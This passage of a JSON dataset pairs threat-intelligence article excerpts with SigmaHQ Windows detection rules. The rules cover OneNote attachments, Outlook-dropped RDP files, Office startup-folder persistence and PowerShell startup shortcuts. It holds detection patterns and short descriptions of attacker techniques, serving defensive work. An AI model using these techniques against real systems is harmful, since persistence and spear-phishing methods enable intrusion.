      "title": "OneNote Attachment File Dropped In Suspicious Location",
      "id": "7fd164ba-126a-4d9c-9392-0d4f7c243df0",
      "status": "test",
      "description": "Detects creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing OneNote attachments",
      "references": [
        "https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-22",
      "modified": "2023-09-19",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            "\\AppData\\Local\\Temp\\",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            ":\\Temp\\"
          ],
          "TargetFilename|endswith": [
            ".one",
            ".onepkg"
          ]
        },
        "filter_main_onenote": {
          "Image|contains": ":\\Program Files\\Microsoft Office\\",
          "Image|endswith": "\\ONENOTE.EXE"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate usage of \".one\" or \".onepkg\" files from those locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_onenote_files_in_susp_locations.yml"
  },
  "867": {
    "url": "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/",
    "markdown": "# Microsoft OneNote (.One File Extension) Attachment Delivers AsyncRAT **12 February 2024** Users reported some malicious Microsoft OneNote documents in the past days that lead to AsyncRAT, a remote administration tool used to control and monitor other computers. While it is common to see Microsoft Word, Excel and PowerPoint maldocs distributed via emails, OneNote maldocs are something new that we don’t frequently see. ```image Alt: OneNote maldicious document Description: The image depicts a Microsoft OneNote document displaying an invoice. Prominently featured in the foreground is a large blue button with the text \"Double Click To View File\". The background shows",
    "sigma_rule": {
      "title": "OneNote Attachment File Dropped In Suspicious Location",
      "id": "7fd164ba-126a-4d9c-9392-0d4f7c243df0",
      "status": "test",
      "description": "Detects creation of files with the \".one\"/\".onepkg\" extension in suspicious or uncommon locations. This could be a sign of attackers abusing OneNote attachments",
      "references": [
        "https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/",
        "https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-22",
      "modified": "2023-09-19",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": [
            "\\AppData\\Local\\Temp\\",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            ":\\Temp\\"
          ],
          "TargetFilename|endswith": [
            ".one",
            ".onepkg"
          ]
        },
        "filter_main_onenote": {
          "Image|contains": ":\\Program Files\\Microsoft Office\\",
          "Image|endswith": "\\ONENOTE.EXE"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate usage of \".one\" or \".onepkg\" files from those locations"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_onenote_files_in_susp_locations.yml"
  },
  "868": {
    "url": "https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/",
    "markdown": "# Rogue RDP Files Used in Latest Campaign Targeting Ukrainian Government, Military Hackers are trying to gain remote access to Ukrainian government and military systems leveraging Remote Desktop Protocol (RDP) configuration files, disguised as popular network and security services. **October 23, 2024** *A Ukrainian mechanized infantry soldier fires at Opposing Forces (OPFOR) trying to advance forward, during the culminating force on force exercise of Combined Resolve XII at the Joint Multinational Readiness Center in Hohenfels, Germany Aug. 19, 2019. Combined Resolve is a biannual U.S. Army Europe and 7th Army Training Command-led exercise intended to evaluate and certify the readiness",
    "sigma_rule": {
      "title": ".RDP File Created by Outlook Process",
      "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
      "related": [
        {
          "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the creation of files with the \".rdp\" extensions in the temporary directory that Outlook uses when opening attachments.\nThis can be used to detect spear-phishing campaigns that use RDP files as attachments.\n",
      "references": [
        "https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/",
        "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
        "https://www.linkedin.com/feed/update/urn:li:ugcPost:7257437202706493443?commentUrn=urn%3Ali%3Acomment%3A%28ugcPost%3A7257437202706493443%2C7257522819985543168%29&dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287257522819985543168%2Curn%3Ali%3AugcPost%3A7257437202706493443%29"
      ],
      "author": "Florian Roth",
      "date": "2024-11-01",
      "modified": "2024-11-03",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_extension": {
          "TargetFilename|endswith": ".rdp"
        },
        "selection_location": [
          {
            "TargetFilename|contains": [
              "\\AppData\\Local\\Packages\\Microsoft.Outlook_",
              "\\AppData\\Local\\Microsoft\\Olk\\Attachments\\"
            ]
          },
          {
            "TargetFilename|contains|all": [
              "\\AppData\\Local\\Microsoft\\Windows\\",
              "\\Content.Outlook\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Whenever someone receives an RDP file as an email attachment and decides to save or open it right from the attachments"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_outlook_rdp_file_creation.yml"
  },
  "869": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
    "markdown": "# Midnight Blizzard conducts large-scale spear-phishing campaign using RDP files **Published on October 29, 2024** Since October 22, 2024, Microsoft Threat Intelligence has observed Russian threat actor Midnight Blizzard sending a series of highly targeted spear-phishing emails to individuals in government, academia, defense, non-governmental organizations, and other sectors. This activity is ongoing, and Microsoft will continue to investigate and provide updates as available. Based on our investigation of previous Midnight Blizzard spear-phishing campaigns, we assess that the goal of this operation is likely intelligence collection. Microsoft is releasing this blog to notify the public and disrupt this threat actor activity.",
    "sigma_rule": {
      "title": ".RDP File Created by Outlook Process",
      "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
      "related": [
        {
          "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the creation of files with the \".rdp\" extensions in the temporary directory that Outlook uses when opening attachments.\nThis can be used to detect spear-phishing campaigns that use RDP files as attachments.\n",
      "references": [
        "https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/",
        "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
        "https://www.linkedin.com/feed/update/urn:li:ugcPost:7257437202706493443?commentUrn=urn%3Ali%3Acomment%3A%28ugcPost%3A7257437202706493443%2C7257522819985543168%29&dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287257522819985543168%2Curn%3Ali%3AugcPost%3A7257437202706493443%29"
      ],
      "author": "Florian Roth",
      "date": "2024-11-01",
      "modified": "2024-11-03",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_extension": {
          "TargetFilename|endswith": ".rdp"
        },
        "selection_location": [
          {
            "TargetFilename|contains": [
              "\\AppData\\Local\\Packages\\Microsoft.Outlook_",
              "\\AppData\\Local\\Microsoft\\Olk\\Attachments\\"
            ]
          },
          {
            "TargetFilename|contains|all": [
              "\\AppData\\Local\\Microsoft\\Windows\\",
              "\\Content.Outlook\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Whenever someone receives an RDP file as an email attachment and decides to save or open it right from the attachments"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_outlook_rdp_file_creation.yml"
  },
  "870": {
    "url": "https://www.linkedin.com/feed/update/urn:li:ugcPost:7257437202706493443?commentUrn=urn%3Ali%3Acomment%3A%28ugcPost%3A7257437202706493443%2C7257522819985543168%29&dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287257522819985543168%2Curn%3Ali%3AugcPost%3A7257437202706493443%29",
    "markdown": "# Post Microsoft published a report on #Nobelium (aka #MidnightBlizzard) threat group conducting large-scale spear-phishing campaign using RDP files. I'm sharing the hashes for the mentioned malicious *.rdp files, a #YARA rule to scan for files with similar characteristics and a Sigma rule to detect Outlook.exe writing *.rdp files to disk. The rule is already available in the free THOR Cloud Lite (see below). **Report**: https://lnkd.in/e_qAg9G6 **RDP File Hashes** - db326d934e386059cc56c4e61695128e - 40f957b756096fa6b80f95334ba92034 - f58cf55b944f5942f1d120d95140b800 - b38e7e8bba44bc5619b2689024ad9fca - e1d7de6979c84a2ccaa2aba993634c48 - f7e04aab0707df0dc79f6aea577d76ea - 48ed82f14472518251086afc26d886ea - 3d7e2ee43faf15c1776aa0277db1c2a5 - 280ab6fa6087c57b43cd5ac6c257082c **YARA rule**: https://lnkd.in/eSAt7XSu **Sigma rule**: https://lnkd.in/et4DTRGn **THOR Cloud Lite**: https://lnkd.in/eD6qTDvh ```image Alt: Image",
    "sigma_rule": {
      "title": ".RDP File Created by Outlook Process",
      "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
      "related": [
        {
          "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the creation of files with the \".rdp\" extensions in the temporary directory that Outlook uses when opening attachments.\nThis can be used to detect spear-phishing campaigns that use RDP files as attachments.\n",
      "references": [
        "https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/",
        "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
        "https://www.linkedin.com/feed/update/urn:li:ugcPost:7257437202706493443?commentUrn=urn%3Ali%3Acomment%3A%28ugcPost%3A7257437202706493443%2C7257522819985543168%29&dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287257522819985543168%2Curn%3Ali%3AugcPost%3A7257437202706493443%29"
      ],
      "author": "Florian Roth",
      "date": "2024-11-01",
      "modified": "2024-11-03",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_extension": {
          "TargetFilename|endswith": ".rdp"
        },
        "selection_location": [
          {
            "TargetFilename|contains": [
              "\\AppData\\Local\\Packages\\Microsoft.Outlook_",
              "\\AppData\\Local\\Microsoft\\Olk\\Attachments\\"
            ]
          },
          {
            "TargetFilename|contains|all": [
              "\\AppData\\Local\\Microsoft\\Windows\\",
              "\\Content.Outlook\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Whenever someone receives an RDP file as an email attachment and decides to save or open it right from the attachments"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_outlook_rdp_file_creation.yml"
  },
  "871": {
    "url": "https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies",
    "markdown": "# Operation RestyLink: APT campaign targeting Japanese companies --- Published May 13, 2022 This article is a translation of the \"Operation RestyLink: 日本企業を狙った標的型攻撃キャンペーン\". --- Our SOC observed an APT campaign targeting Japanese companies starting from mid-April 2022. We think that this campaign had already started in March 2022 and related attacks might have been performed around October 2021. It implies that this campaign is not temporary nor intensive, and it could continue from here forward. In this article, we report the detailed analysis of this campaign and discuss the attributes of the attacking group. ## Attack Overview The attack that",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Startup Folder",
      "id": "0e20c89d-2264-44ae-8238-aeeaba609ece",
      "status": "test",
      "description": "Detects creation of Microsoft Office files inside of one of the default startup folders in order to achieve persistence.",
      "references": [
        "https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies",
        "https://web.archive.org/web/20240304163011/https://learn.microsoft.com/en-us/office/troubleshoot/excel/use-startup-folders"
      ],
      "author": "Max Altgelt (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-02",
      "modified": "2023-06-22",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_word_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Word\\STARTUP"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\STARTUP"
            ]
          }
        ],
        "selection_word_extension": {
          "TargetFilename|endswith": [
            ".doc",
            ".docm",
            ".docx",
            ".dot",
            ".dotm",
            ".rtf"
          ]
        },
        "selection_excel_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Excel\\XLSTART"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\XLSTART"
            ]
          }
        ],
        "selection_excel_extension": {
          "TargetFilename|endswith": [
            ".xls",
            ".xlsm",
            ".xlsx",
            ".xlt",
            ".xltm"
          ]
        },
        "filter_main_office": {
          "Image|endswith": [
            "\\WINWORD.exe",
            "\\EXCEL.exe"
          ]
        },
        "condition": "(all of selection_word_* or all of selection_excel_*) and not filter_main_office"
      },
      "falsepositives": [
        "Loading a user environment from a backup or a domain controller",
        "Synchronization of templates"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_startup_persistence.yml"
  },
  "872": {
    "url": "https://web.archive.org/web/20240304163011/https://learn.microsoft.com/en-us/office/troubleshoot/excel/use-startup-folders",
    "markdown": "# Use startup folders in Excel For information about Excel 2010, Excel for Mac 2011, and later versions, see the following articles: - Customize how Excel starts - Customize how Excel starts in Excel for Mac. ## Summary This step-by-step article describes how to use the Microsoft Excel startup folders. Excel uses startup folders in two ways: - To load Excel workbooks at startup. - As a reference location for templates. The actual startup folder locations vary, depending on which version of Excel you use. ## Folders that Excel uses at startup If you install Excel in the default location,",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Startup Folder",
      "id": "0e20c89d-2264-44ae-8238-aeeaba609ece",
      "status": "test",
      "description": "Detects creation of Microsoft Office files inside of one of the default startup folders in order to achieve persistence.",
      "references": [
        "https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies",
        "https://web.archive.org/web/20240304163011/https://learn.microsoft.com/en-us/office/troubleshoot/excel/use-startup-folders"
      ],
      "author": "Max Altgelt (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-02",
      "modified": "2023-06-22",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_word_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Word\\STARTUP"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\STARTUP"
            ]
          }
        ],
        "selection_word_extension": {
          "TargetFilename|endswith": [
            ".doc",
            ".docm",
            ".docx",
            ".dot",
            ".dotm",
            ".rtf"
          ]
        },
        "selection_excel_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Excel\\XLSTART"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\XLSTART"
            ]
          }
        ],
        "selection_excel_extension": {
          "TargetFilename|endswith": [
            ".xls",
            ".xlsm",
            ".xlsx",
            ".xlt",
            ".xltm"
          ]
        },
        "filter_main_office": {
          "Image|endswith": [
            "\\WINWORD.exe",
            "\\EXCEL.exe"
          ]
        },
        "condition": "(all of selection_word_* or all of selection_excel_*) and not filter_main_office"
      },
      "falsepositives": [
        "Loading a user environment from a backup or a domain controller",
        "Synchronization of templates"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_startup_persistence.yml"
  },
  "873": {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Categories:** adfind cobaltstrike icedid ransomware revil Sodinokibi **Published on:** March 29, 2021 ### Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat",
    "sigma_rule": {
      "title": "File With Uncommon Extension Created By An Office Application",
      "id": "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
      "status": "test",
      "description": "Detects the creation of files with an executable or script extension by an Office application.",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-06-22",
      "tags": [
        "attack.t1204.002",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection1": {
          "Image|endswith": [
            "\\excel.exe",
            "\\msaccess.exe",
            "\\mspub.exe",
            "\\powerpnt.exe",
            "\\visio.exe",
            "\\winword.exe"
          ]
        },
        "selection2": {
          "TargetFilename|endswith": [
            ".bat",
            ".cmd",
            ".com",
            ".dll",
            ".exe",
            ".hta",
            ".ocx",
            ".proj",
            ".ps1",
            ".scf",
            ".scr",
            ".sys",
            ".vbe",
            ".vbs",
            ".wsf",
            ".wsh"
          ]
        },
        "filter_optional_webservicecache": {
          "TargetFilename|contains|all": [
            "C:\\Users\\",
            "\\AppData\\Local\\Microsoft\\Office\\",
            "\\WebServiceCache\\AllUsers"
          ],
          "TargetFilename|endswith": ".com"
        },
        "filter_optional_webex": {
          "Image|endswith": "\\winword.exe",
          "TargetFilename|contains": "\\AppData\\Local\\Temp\\webexdelta\\",
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "filter_main_localassembly": {
          "TargetFilename|contains": "\\AppData\\Local\\assembly\\tmp\\",
          "TargetFilename|endswith": ".dll"
        },
        "condition": "all of selection* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_susp_file_extension.yml"
  },
  "874": {
    "url": "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml",
    "markdown": "# Sodinokibi (aka REvil) Ransomware **Source Type:** Threat Intelligence Report **Vendor:** The DFIR Report **Published:** 29.03.2021 **Link:** Sodinokibi (aka REvil) Ransomware **Analyzed By:** Vadim Khrykov (@BlackMatter23) ## Threat Information ### Name - REvil ### Aliases - Sodinokibi - GOLD SOUTHFIELD - G0115 ### Attribution - Worldwide ### Tools - IceID (Bokbot) - Cobalt Strike - Bloodhound ## Analysis ### Quote - \"Initial execution of the document writes a file to... The Excel file called wmic to execute the file with regsrv32\" ### MITRE ATT&CK #### Execution - T1204.002 - User Execution - Malicious File - T1047 - Windows Management Instrumentation",
    "sigma_rule": {
      "title": "File With Uncommon Extension Created By An Office Application",
      "id": "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
      "status": "test",
      "description": "Detects the creation of files with an executable or script extension by an Office application.",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-06-22",
      "tags": [
        "attack.t1204.002",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection1": {
          "Image|endswith": [
            "\\excel.exe",
            "\\msaccess.exe",
            "\\mspub.exe",
            "\\powerpnt.exe",
            "\\visio.exe",
            "\\winword.exe"
          ]
        },
        "selection2": {
          "TargetFilename|endswith": [
            ".bat",
            ".cmd",
            ".com",
            ".dll",
            ".exe",
            ".hta",
            ".ocx",
            ".proj",
            ".ps1",
            ".scf",
            ".scr",
            ".sys",
            ".vbe",
            ".vbs",
            ".wsf",
            ".wsh"
          ]
        },
        "filter_optional_webservicecache": {
          "TargetFilename|contains|all": [
            "C:\\Users\\",
            "\\AppData\\Local\\Microsoft\\Office\\",
            "\\WebServiceCache\\AllUsers"
          ],
          "TargetFilename|endswith": ".com"
        },
        "filter_optional_webex": {
          "Image|endswith": "\\winword.exe",
          "TargetFilename|contains": "\\AppData\\Local\\Temp\\webexdelta\\",
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "filter_main_localassembly": {
          "TargetFilename|contains": "\\AppData\\Local\\assembly\\tmp\\",
          "TargetFilename|endswith": ".dll"
        },
        "condition": "all of selection* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_susp_file_extension.yml"
  },
  "875": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious File Created In PerfLogs",
      "id": "bbb7e38c-0b41-4a11-b306-d2a457b7ac2b",
      "status": "test",
      "description": "Detects suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|startswith": "C:\\PerfLogs\\",
          "TargetFilename|endswith": [
            ".7z",
            ".bat",
            ".bin",
            ".chm",
            ".dll",
            ".exe",
            ".hta",
            ".lnk",
            ".ps1",
            ".psm1",
            ".py",
            ".scr",
            ".sys",
            ".vbe",
            ".vbs",
            ".zip"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_perflogs_susp_files.yml"
  },
  "876": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Suspicious File Created In PerfLogs",
      "id": "bbb7e38c-0b41-4a11-b306-d2a457b7ac2b",
      "status": "test",
      "description": "Detects suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|startswith": "C:\\PerfLogs\\",
          "TargetFilename|endswith": [
            ".7z",
            ".bat",
            ".bin",
            ".chm",
            ".dll",
            ".exe",
            ".hta",
            ".lnk",
            ".ps1",
            ".psm1",
            ".py",
            ".scr",
            ".sys",
            ".vbe",
            ".vbs",
            ".zip"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_perflogs_susp_files.yml"
  },
  "877": {
    "url": "https://redcanary.com/blog/intelligence-insights-october-2021/",
    "markdown": "## Intelligence Insights: October 2021 Yellow Cockatoo takes flight again, ZLoader changes tactics, BlackByte emerges as a new threat, and Conti demonstrates ransomware is not gone. *Originally published October 21, 2021. Last modified April 30, 2024.* --- Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community. ### Highlights September brought some changes in our threat rankings,",
    "sigma_rule": {
      "title": "Potential Startup Shortcut Persistence Via PowerShell.EXE",
      "id": "92fa78e7-4d39-45f1-91a3-8b23f3f1088d",
      "status": "test",
      "description": "Detects PowerShell writing startup shortcuts.\nThis procedure was highlighted in Red Canary Intel Insights Oct. 2021, \"We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence.\nAccordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats.\nIn the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL\"\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE",
      "date": "2021-10-24",
      "modified": "2023-02-23",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "TargetFilename|contains": "\\start menu\\programs\\startup\\",
          "TargetFilename|endswith": ".lnk"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Depending on your environment accepted applications may leverage this at times. It is recommended to search for anomalies inidicative of malware."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_powershell_startup_shortcuts.yml"
  },
  "878": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder",
    "markdown": "# T1547.001 - Registry Run Keys / Startup Folder ## Description from ATT&CK Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. Placing a program within a startup folder will also cause that program to execute when a user logs",
    "sigma_rule": {
      "title": "Potential Startup Shortcut Persistence Via PowerShell.EXE",
      "id": "92fa78e7-4d39-45f1-91a3-8b23f3f1088d",
      "status": "test",
      "description": "Detects PowerShell writing startup shortcuts.\nThis procedure was highlighted in Red Canary Intel Insights Oct. 2021, \"We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence.\nAccordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats.\nIn the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL\"\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder"
      ],
      "author": "Christopher Peacock '@securepeacock', SCYTHE",
      "date": "2021-10-24",
      "modified": "2023-02-23",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "TargetFilename|contains": "\\start menu\\programs\\startup\\",
          "TargetFilename|endswith": ".lnk"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Depending on your environment accepted applications may leverage this at times. It is recommended to search for anomalies inidicative of malware."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_powershell_startup_shortcuts.yml"
  },
  "879": {
    "url": "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
